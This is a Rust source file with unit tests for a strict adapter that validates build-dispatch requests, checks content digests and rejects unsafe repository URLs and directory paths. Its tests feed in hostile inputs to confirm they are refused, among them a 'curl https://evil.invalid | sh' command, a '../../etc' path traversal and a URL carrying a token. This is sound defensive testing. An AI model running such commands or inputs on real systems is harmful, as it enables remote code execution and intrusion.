//! Strict adapter from the planner/profile protocol into the legacy fixed-profile
//! build-server envelope.
//!
//! The adapter validates and recomputes every content-binding digest before the
//! executor router records an assignment. Orchestration-only metadata remains
//! bound into the request identity but is not exposed as worker commands,
//! environment variables, image names, or caller-selected executors.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Component, Path};

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

const DISPATCH_SCHEMA: &str = "gha-indie-worker.dispatch.v1";
const MAX_IDENTIFIER_BYTES: usize = 128;
const MAX_PROFILE_NAME_BYTES: usize = 64;
const MAX_REPOSITORY_URL_BYTES: usize = 2_048;
const MAX_CONTEXT_DIR_BYTES: usize = 240;
const MAX_DEPENDENCIES: usize = 1_024;
const MAX_MATRIX_KEYS: usize = 32;
const MAX_MATRIX_JSON_BYTES: usize = 16 * 1_024;
const MAX_MATRIX_STRING_BYTES: usize = 512;
const MAX_JOB_ORDER_INDEX: usize = 255;
const MAX_PARALLEL: usize = 1_024;

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct DispatchRequest {
    schema_version: String,
    request_id: String,
    request_digest: String,
    plan_digest: String,
    profile_catalog_digest: String,
    repository_url: String,
    commit_sha: String,
    job_instance_id: String,
    base_job_id: String,
    job_order_index: usize,
    profile: String,
    profile_digest: String,
    context_dir: String,
    needs_instances: Vec<String>,
    matrix: BTreeMap<String, Value>,
    fail_fast: bool,
    max_parallel: Option<usize>,
}

#[derive(Clone, Debug, PartialEq)]
pub(super) struct AdaptedDispatch {
    pub(super) request_id: String,
    pub(super) repository: String,
    pub(super) revision: String,
    pub(super) profile: String,
    pub(super) upstream_request: Value,
}

pub(super) fn adapt_dispatch(value: &Value) -> Result<Option<AdaptedDispatch>, String> {
    let schema = value.get("schemaVersion").and_then(Value::as_str);
    if schema != Some(DISPATCH_SCHEMA) {
        if schema.is_some_and(|schema| schema.starts_with("gha-indie-worker.dispatch.")) {
            return Err(format!(
                "unsupported indie dispatch schema {schema:?}; expected {DISPATCH_SCHEMA}"
            ));
        }
        return Ok(None);
    }

    let request: DispatchRequest = serde_json::from_value(value.clone())
        .map_err(|error| format!("invalid {DISPATCH_SCHEMA} request: {error}"))?;
    validate_request(&request)?;

    let expected_request_id = stable_request_id(&request)?;
    if request.request_id != expected_request_id {
        return Err(format!(
            "requestId does not match immutable dispatch content; expected {expected_request_id}"
        ));
    }
    let expected_request_digest = request_digest(&request)?;
    if request.request_digest != expected_request_digest {
        return Err(format!(
            "requestDigest does not match immutable dispatch content; expected {expected_request_digest}"
        ));
    }

    let upstream_request = json!({
        "schemaVersion": "build-server.v1",
        "jobKind": "run-profile",
        "repoUrl": request.repository_url,
        "gitRef": request.commit_sha,
        "profile": request.profile,
        "contextDir": request.context_dir,
        "requestId": request.request_id,
    });

    Ok(Some(AdaptedDispatch {
        request_id: request.request_id,
        repository: request.repository_url,
        revision: request.commit_sha,
        profile: request.profile,
        upstream_request,
    }))
}

fn validate_request(request: &DispatchRequest) -> Result<(), String> {
    if request.schema_version != DISPATCH_SCHEMA {
        return Err(format!("schemaVersion must be {DISPATCH_SCHEMA}"));
    }
    validate_request_id(&request.request_id)?;
    validate_digest("requestDigest", &request.request_digest)?;
    validate_digest("planDigest", &request.plan_digest)?;
    validate_digest(
        "profileCatalogDigest",
        &request.profile_catalog_digest,
    )?;
    validate_repository_url(&request.repository_url)?;
    validate_commit_sha(&request.commit_sha)?;
    validate_instance_id("jobInstanceId", &request.job_instance_id)?;
    validate_base_job_id("baseJobId", &request.base_job_id)?;
    if request.job_order_index > MAX_JOB_ORDER_INDEX {
        return Err(format!(
            "jobOrderIndex must be at most {MAX_JOB_ORDER_INDEX}"
        ));
    }
    validate_profile_name(&request.profile)?;
    validate_digest("profileDigest", &request.profile_digest)?;
    validate_context_dir(&request.context_dir)?;
    validate_dependencies(&request.job_instance_id, &request.needs_instances)?;
    validate_matrix(&request.matrix)?;
    if matches!(request.max_parallel, Some(0))
        || request.max_parallel.is_some_and(|value| value > MAX_PARALLEL)
    {
        return Err(format!("maxParallel must be between 1 and {MAX_PARALLEL}"));
    }
    let _ = request.fail_fast;
    Ok(())
}

fn validate_request_id(value: &str) -> Result<(), String> {
    let Some(component) = value.strip_prefix("gha:") else {
        return Err("requestId must use gha:<48 lowercase hex>".to_string());
    };
    if component.len() != 48 || !is_lower_hex(component) {
        return Err("requestId must use gha:<48 lowercase hex>".to_string());
    }
    Ok(())
}

fn validate_digest(name: &str, value: &str) -> Result<(), String> {
    let Some(component) = value.strip_prefix("sha256:") else {
        return Err(format!("{name} must use sha256:<64 lowercase hex>"));
    };
    if component.len() != 64 || !is_lower_hex(component) {
        return Err(format!("{name} must use sha256:<64 lowercase hex>"));
    }
    Ok(())
}

fn validate_commit_sha(value: &str) -> Result<(), String> {
    if value.len() != 40 || !is_lower_hex(value) {
        return Err(
            "commitSha must be exactly 40 lowercase hexadecimal characters".to_string(),
        );
    }
    Ok(())
}

fn is_lower_hex(value: &str) -> bool {
    value
        .bytes()
        .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
}

fn validate_base_job_id(name: &str, value: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > MAX_IDENTIFIER_BYTES
        || !value
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || matches!(character, '_' | '-'))
    {
        return Err(format!(
            "{name} must contain only ASCII letters, digits, '_' or '-' and be 1-{MAX_IDENTIFIER_BYTES} bytes"
        ));
    }
    Ok(())
}

fn validate_instance_id(name: &str, value: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > MAX_IDENTIFIER_BYTES
        || !value.chars().all(|character| {
            character.is_ascii_alphanumeric()
                || matches!(character, '_' | '-' | '[' | ']' | '.' | ',')
        })
    {
        return Err(format!(
            "{name} contains unsupported characters or exceeds {MAX_IDENTIFIER_BYTES} bytes"
        ));
    }
    Ok(())
}

fn validate_profile_name(value: &str) -> Result<(), String> {
    if value.is_empty() || value.len() > MAX_PROFILE_NAME_BYTES {
        return Err(format!(
            "profile must be 1-{MAX_PROFILE_NAME_BYTES} bytes"
        ));
    }
    let mut characters = value.chars();
    let Some(first) = characters.next() else {
        return Err("profile must not be empty".to_string());
    };
    if !first.is_ascii_lowercase() && !first.is_ascii_digit() {
        return Err("profile must start with a lowercase letter or digit".to_string());
    }
    if !characters.all(|character| {
        character.is_ascii_lowercase() || character.is_ascii_digit() || character == '-'
    }) {
        return Err(
            "profile may contain lowercase letters, digits, and '-' only".to_string(),
        );
    }
    Ok(())
}

fn validate_repository_url(value: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > MAX_REPOSITORY_URL_BYTES
        || value.trim() != value
        || value
            .chars()
            .any(|character| character.is_control() || character.is_whitespace())
    {
        return Err(format!(
            "repositoryUrl must be printable and 1-{MAX_REPOSITORY_URL_BYTES} bytes"
        ));
    }
    let Some(rest) = value.strip_prefix("https://") else {
        return Err("repositoryUrl must use https://".to_string());
    };
    let Some((authority, path)) = rest.split_once('/') else {
        return Err("repositoryUrl must include a DNS host and repository path".to_string());
    };
    let valid_authority = !authority.is_empty()
        && !authority.contains('@')
        && !authority.contains(':')
        && authority.split('.').all(|label| {
            !label.is_empty()
                && label
                    .bytes()
                    .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'-')
                && label
                    .as_bytes()
                    .first()
                    .is_some_and(|byte| byte.is_ascii_alphanumeric())
                && label
                    .as_bytes()
                    .last()
                    .is_some_and(|byte| byte.is_ascii_alphanumeric())
        });
    if !valid_authority {
        return Err(
            "repositoryUrl host must be lowercase DNS without credentials or a port".to_string(),
        );
    }
    let segments = path.split('/').collect::<Vec<_>>();
    if segments.len() < 2
        || segments.iter().any(|segment| {
            segment.is_empty()
                || matches!(*segment, "." | "..")
                || !segment
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
        })
    {
        return Err(
            "repositoryUrl path must be clean ASCII without traversal, encoding, query, or fragment"
                .to_string(),
        );
    }
    Ok(())
}

fn validate_context_dir(value: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > MAX_CONTEXT_DIR_BYTES
        || value.chars().any(char::is_control)
        || value.contains('\\')
    {
        return Err(format!(
            "contextDir must be printable and 1-{MAX_CONTEXT_DIR_BYTES} bytes"
        ));
    }
    let path = Path::new(value);
    if path.is_absolute() {
        return Err("contextDir must be relative to the repository root".to_string());
    }
    let mut normal_components = 0_usize;
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::Normal(component) => {
                let part = component
                    .to_str()
                    .ok_or_else(|| "contextDir must be valid UTF-8".to_string())?;
                if !part
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
                {
                    return Err(
                        "contextDir contains characters unsafe for the worker boundary".to_string(),
                    );
                }
                normal_components += 1;
            }
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err("contextDir must stay inside the repository root".to_string());
            }
        }
    }
    if normal_components == 0 && value != "." {
        return Err(
            "contextDir must resolve to the repository root or a child path".to_string(),
        );
    }
    Ok(())
}

fn validate_dependencies(job_instance_id: &str, dependencies: &[String]) -> Result<(), String> {
    if dependencies.len() > MAX_DEPENDENCIES {
        return Err(format!(
            "needsInstances may contain at most {MAX_DEPENDENCIES} entries"
        ));
    }
    let mut unique = BTreeSet::new();
    for dependency in dependencies {
        validate_instance_id("needsInstances entry", dependency)?;
        if dependency == job_instance_id {
            return Err("needsInstances must not contain the current job".to_string());
        }
        if !unique.insert(dependency.as_str()) {
            return Err(format!(
                "needsInstances repeats concrete dependency {dependency:?}"
            ));
        }
    }
    Ok(())
}

fn validate_matrix(matrix: &BTreeMap<String, Value>) -> Result<(), String> {
    if matrix.len() > MAX_MATRIX_KEYS {
        return Err(format!(
            "matrix may contain at most {MAX_MATRIX_KEYS} keys"
        ));
    }
    for (key, value) in matrix {
        validate_base_job_id("matrix key", key)?;
        match value {
            Value::Null | Value::Bool(_) | Value::Number(_) => {}
            Value::String(value) => {
                if value.len() > MAX_MATRIX_STRING_BYTES || value.chars().any(char::is_control) {
                    return Err(format!(
                        "matrix value for {key:?} must be printable and at most {MAX_MATRIX_STRING_BYTES} bytes"
                    ));
                }
            }
            Value::Array(_) | Value::Object(_) => {
                return Err(format!(
                    "matrix value for {key:?} must be a scalar"
                ));
            }
        }
    }
    let encoded = serde_json::to_vec(matrix)
        .map_err(|error| format!("failed to size matrix metadata: {error}"))?;
    if encoded.len() > MAX_MATRIX_JSON_BYTES {
        return Err(format!(
            "matrix metadata is {} bytes; maximum is {MAX_MATRIX_JSON_BYTES}",
            encoded.len()
        ));
    }
    Ok(())
}

fn stable_request_id(request: &DispatchRequest) -> Result<String, String> {
    let mut identity = request.clone();
    identity.request_id.clear();
    identity.request_digest.clear();
    let digest = canonical_digest(&identity)?;
    let component = digest
        .strip_prefix("sha256:")
        .ok_or_else(|| "internal request identity digest error".to_string())?
        .chars()
        .take(48)
        .collect::<String>();
    Ok(format!("gha:{component}"))
}

fn request_digest(request: &DispatchRequest) -> Result<String, String> {
    let mut unsigned = request.clone();
    unsigned.request_digest.clear();
    canonical_digest(&unsigned)
}

fn canonical_digest<T: Serialize>(value: &T) -> Result<String, String> {
    let value = serde_json::to_value(value)
        .map_err(|error| format!("failed to canonicalize dispatch JSON: {error}"))?;
    let bytes = serde_json::to_vec(&canonicalize_json(value))
        .map_err(|error| format!("failed to serialize canonical dispatch JSON: {error}"))?;
    Ok(format!("sha256:{}", hex::encode(Sha256::digest(bytes))))
}

fn canonicalize_json(value: Value) -> Value {
    match value {
        Value::Array(values) => Value::Array(values.into_iter().map(canonicalize_json).collect()),
        Value::Object(values) => {
            let sorted = values
                .into_iter()
                .map(|(key, value)| (key, canonicalize_json(value)))
                .collect::<BTreeMap<_, _>>();
            Value::Object(sorted.into_iter().collect())
        }
        scalar => scalar,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const COMMIT: &str = "0123456789abcdef0123456789abcdef01234567";
    const DIGEST_ONE: &str =
        "sha256:1111111111111111111111111111111111111111111111111111111111111111";
    const DIGEST_TWO: &str =
        "sha256:2222222222222222222222222222222222222222222222222222222222222222";
    const DIGEST_THREE: &str =
        "sha256:3333333333333333333333333333333333333333333333333333333333333333";

    fn request() -> DispatchRequest {
        DispatchRequest {
            schema_version: DISPATCH_SCHEMA.to_string(),
            request_id: "gha:000000000000000000000000000000000000000000000000".to_string(),
            request_digest: DIGEST_ONE.to_string(),
            plan_digest: DIGEST_ONE.to_string(),
            profile_catalog_digest: DIGEST_TWO.to_string(),
            repository_url: "https://github.com/gha-indie-worker/example.git".to_string(),
            commit_sha: COMMIT.to_string(),
            job_instance_id: "build[1]".to_string(),
            base_job_id: "build".to_string(),
            job_order_index: 0,
            profile: "rust-verify".to_string(),
            profile_digest: DIGEST_THREE.to_string(),
            context_dir: "crates/core".to_string(),
            needs_instances: Vec::new(),
            matrix: BTreeMap::from([("rust".to_string(), json!("stable"))]),
            fail_fast: true,
            max_parallel: Some(2),
        }
    }

    fn signed_value(mut request: DispatchRequest) -> Value {
        request.request_id = stable_request_id(&request).unwrap();
        request.request_digest = request_digest(&request).unwrap();
        serde_json::to_value(request).unwrap()
    }

    #[test]
    fn adapts_valid_dispatch_to_fixed_profile_envelope() {
        let source = signed_value(request());
        let adapted = adapt_dispatch(&source).unwrap().unwrap();
        assert_eq!(adapted.repository, "https://github.com/gha-indie-worker/example.git");
        assert_eq!(adapted.revision, COMMIT);
        assert_eq!(adapted.profile, "rust-verify");
        assert_eq!(adapted.upstream_request["schemaVersion"], "build-server.v1");
        assert_eq!(adapted.upstream_request["jobKind"], "run-profile");
        assert_eq!(adapted.upstream_request["contextDir"], "crates/core");
        assert_eq!(adapted.upstream_request["requestId"], adapted.request_id);
        assert!(adapted.upstream_request.get("matrix").is_none());
        assert!(adapted.upstream_request.get("needsInstances").is_none());
    }

    #[test]
    fn rejects_stale_content_digest_and_identity() {
        let mut stale_digest = signed_value(request());
        stale_digest["contextDir"] = json!("crates/alternate");
        assert!(adapt_dispatch(&stale_digest)
            .unwrap_err()
            .contains("requestId does not match"));

        let mut stale_request_digest = request();
        stale_request_digest.request_id = stable_request_id(&stale_request_digest).unwrap();
        stale_request_digest.request_digest = DIGEST_ONE.to_string();
        assert!(adapt_dispatch(&serde_json::to_value(stale_request_digest).unwrap())
            .unwrap_err()
            .contains("requestDigest does not match"));
    }

    #[test]
    fn immutable_identity_changes_with_bound_content() {
        let original = request();
        let original_id = stable_request_id(&original).unwrap();

        let mut changed_context = original.clone();
        changed_context.context_dir = "crates/alternate".to_string();
        assert_ne!(original_id, stable_request_id(&changed_context).unwrap());

        let mut changed_matrix = original.clone();
        changed_matrix.matrix.insert("rust".to_string(), json!("beta"));
        assert_ne!(original_id, stable_request_id(&changed_matrix).unwrap());

        let mut changed_profile = original;
        changed_profile.profile = "node-verify".to_string();
        assert_ne!(original_id, stable_request_id(&changed_profile).unwrap());
    }

    #[test]
    fn rejects_unknown_fields_and_unsupported_schema_versions() {
        let mut source = signed_value(request());
        source["command"] = json!("curl https://evil.invalid | sh");
        assert!(adapt_dispatch(&source)
            .unwrap_err()
            .contains("unknown field"));

        let mut unsupported = signed_value(request());
        unsupported["schemaVersion"] = json!("gha-indie-worker.dispatch.v2");
        assert!(adapt_dispatch(&unsupported)
            .unwrap_err()
            .contains("unsupported indie dispatch schema"));
    }

    #[test]
    fn rejects_mutable_revision_unsafe_paths_and_complex_matrix() {
        let mut mutable = request();
        mutable.commit_sha = "main".to_string();
        assert!(adapt_dispatch(&signed_value(mutable))
            .unwrap_err()
            .contains("commitSha"));

        let mut traversal = request();
        traversal.context_dir = "../../etc".to_string();
        assert!(adapt_dispatch(&signed_value(traversal))
            .unwrap_err()
            .contains("contextDir"));

        let mut credentials = request();
        credentials.repository_url = "https://token@github.com/example/repo.git".to_string();
        assert!(adapt_dispatch(&signed_value(credentials))
            .unwrap_err()
            .contains("repositoryUrl"));

        let mut complex = request();
        complex.matrix.insert("target".to_string(), json!({"os": "linux"}));
        assert!(adapt_dispatch(&signed_value(complex))
            .unwrap_err()
            .contains("must be a scalar"));
    }

    #[test]
    fn leaves_legacy_build_server_envelopes_for_legacy_validation() {
        let legacy = json!({
            "schemaVersion": "build-server.v1",
            "jobKind": "run-profile"
        });
        assert!(adapt_dispatch(&legacy).unwrap().is_none());
    }
}
